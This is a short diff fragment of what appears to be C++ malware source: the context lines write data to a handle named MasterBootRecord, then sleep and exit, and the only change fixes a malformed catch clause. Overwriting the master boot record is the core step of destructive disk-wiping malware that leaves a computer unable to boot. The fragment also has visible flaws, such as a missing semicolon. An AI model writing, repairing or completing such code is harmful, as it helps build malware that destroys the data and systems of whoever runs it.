@@ -17,7 +17,7 @@ int main() {
         WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL)
         Sleep(5000);
         ExitProcess();
-    } catch(..){}
+    } catch(...){}
     CloseHandle(MasterBootRecord);
     return EXIT_SUCCESS;
 
